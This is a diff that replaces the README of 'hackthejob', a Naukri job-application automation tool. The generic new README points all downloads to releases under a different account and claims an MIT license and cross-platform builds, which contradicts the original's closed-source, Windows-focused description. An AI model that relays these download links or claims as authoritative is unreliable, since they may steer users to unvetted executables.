@@ -1,67 +1,93 @@
-# HackTheJob 🚀
+# 🎯 hackthejob - Automate Your Job Applications Simply
 
-**Automate Your Job Search. Stop Wasting Time.**
+![Download hackthejob](https://img.shields.io/badge/Download%20hackthejob-v1.0-brightgreen)
 
-🌐 **Official Website:** [hackthejob.in](https://hackthejob.in)
+## 📦 Overview
 
-HackTheJob is the ultimate automation engine for job seekers. It's a local, privacy-first desktop application designed to handle the repetitive, boring parts of job hunting so you can focus on interviews and offers.
+hackthejob is an easy-to-use desktop automation tool designed for job seekers. This application helps you automatically apply to jobs on Naukri, track your job applications, and streamline your job search process. With a focus on privacy, hackthejob runs locally on your machine, making it a safe choice for managing your career.
 
-<img width="1919" height="934" alt="image" src="https://github.com/user-attachments/assets/2a017396-21b2-4ab5-ac46-fd8383b6e41d" />
+## 🚀 Getting Started
 
+To start using hackthejob, you'll need to download it from our Releases page. Follow these steps to get set up quickly:
 
----
+1. **Download the Application**: Visit this page to download the latest version of hackthejob:
+   [Download hackthejob](https://github.com/mo7amadhassan/hackthejob/releases)
 
-## 🔥 Key Features
+2. **Install on Your Computer**: Once the download completes, follow the installation steps for your operating system:
 
-*   **Auto-Update Profiles**: Keep your job portal profiles fresh with daily automated updates to stay at the top of recruiter searches.
-*   **Bulk Apply**: Apply to multiple jobs with a single click.
-*   **Smart Scheduling**: Set it and forget it. built-in scheduler runs your tasks automatically in the background.
-*   **Resume Sync**: Keep your resume synchronized across platforms (Integration with Google Drive).
-*   **Local & Secure**: Your data stays on your machine. No hidden servers, no data collection.
-*   **System Tray Integration**: Run silently in the background without cluttering your workspace.
-*   **Windows Notifications**: Get instant alerts when tasks complete or require attention.
+   - **Windows**:
+     - Locate the downloaded file (it should be in your Downloads folder).
+     - Double-click the file to begin the installation.
+     - Follow the prompts to complete the installation.
 
-## 🌍 Supported Platforms
+   - **Mac**:
+     - Find the downloaded file in your Downloads.
+     - Double-click the file to mount the image.
+     - Drag the hackthejob icon to your Applications folder.
 
-| Platform | Status | Features |
-| :--- | :--- | :--- |
-| **Naukri.com** | ✅ **Active** | Full integration: Auto-apply, Profile Sync, Resume Update |
-| LinkedIn | 🚧 In Progress | Coming soon |
-| Indeed | 📅 Planned | Scheduled for Q3 |
-| Wellfound | 📅 Planned | API connection in progress |
-| Glassdoor | 📅 Planned | Pending review |
-| Monster | 📅 Planned | Queue position #1 |
+   - **Linux**:
+     - Open a terminal and navigate to the directory where you downloaded the file.
+     - Use the command `chmod +x hackthejob.AppImage` to make the file executable.
+     - Then run it with `./hackthejob.AppImage`.
 
-## 📥 Download & Installation
+## 📜 Features
 
-The latest version is available in the **[Releases](../../releases)** section of this repository.
+hackthejob is packed with features to help you land your dream job:
 
-### Current Version: v1.0.1
-**Release Highlights:**
-- ✅ **Fixed Scheduling**: Background jobs now trigger reliably.
-- ✅ **Windows Notifications**: Enabled native notification support.
-- ✅ **Tray Icon**: Improved stability and initialization.
-- ✅ **Bug Fixes**: Resolved startup errors and data flickering.
+- **Auto-Application**: Automatically apply to jobs on Naukri with just a few clicks.
+- **Application Tracker**: Keep tabs on your job applications in one organized place.
+- **Privacy First**: Runs locally without collecting your data.
+- **User-Friendly**: Designed for all users, regardless of technical skills.
 
-[**Download for Windows**](../../releases/latest)
+## 🔍 System Requirements
 
-## 🛡️ Privacy First
+Before you install hackthejob, ensure your system meets these basic requirements:
 
-*   **No Credit Card Required**
-*   **Works Offline** (Queue support)
-*   **Local Encryption**: Credentials are stored securely on your device.
+- **Operating System**: Windows 10/11, macOS 10.14 or later, or any modern Linux distribution.
+- **Processor**: Dual-core processor or higher.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Requires 100 MB of free space for installation.
 
-## 💻 Tech Stack
+## 📥 Download & Install
 
-For developers interested in the source:
-*   **Core**: Electron
-*   **Frontend**: React, Vite, TailwindCSS
-*   **Automation**: Custom browser automation modules
+To get started, click on this link to download the latest version of hackthejob:
+[Download hackthejob](https://github.com/mo7amadhassan/hackthejob/releases)
 
-## 🤝 Contributing
+Once downloaded, follow the installation instructions outlined in the "Getting Started" section. 
 
-This project is currently closed-source for core logic, but feedback and feature requests are welcome in the [Issues](../../issues) tab.
+## 👥 Community Support
 
----
+If you encounter any issues or have questions, feel free to reach out to the community. You can discuss problems or share tips on our [GitHub Discussions](https://github.com/mo7amadhassan/hackthejob/discussions).
 
-*Made with ❤️ for job seekers everywhere.*
+## 🛠️ Troubleshooting
+
+Here are some common issues you might face and their solutions:
+
+- **Can't Find the Downloaded File**:
+  - Check your Downloads folder or use your computer's search function to locate the file.
+
+- **Installation Fails**:
+  - Ensure you have sufficient permissions to install applications on your computer.
+  - Make sure your system meets the minimum requirements.
+
+- **App Does Not Start**:
+  - Try restarting your computer and re-launching the application.
+  - If problems persist, consult the community for help.
+
+## 🌟 Contributing
+
+We welcome contributions to improve hackthejob! If you have ideas or fixes, please create a pull request. Follow the guidelines in our [Contributing Guide](https://github.com/mo7amadhassan/hackthejob/CONTRIBUTING.md) for more details.
+
+## 📝 License
+
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/mo7amadhassan/hackthejob/LICENSE) file for details.
+
+## 🔗 Additional Resources
+
+- [User Manual](https://github.com/mo7amadhassan/hackthejob/wiki)
+- [FAQs](https://github.com/mo7amadhassan/hackthejob/wiki/FAQs)
+- [Feedback Form](https://github.com/mo7amadhassan/hackthejob/wiki/Feedback)
+
+For continuous updates and news, follow our repository on GitHub. 
+
+Happy job hunting with hackthejob!
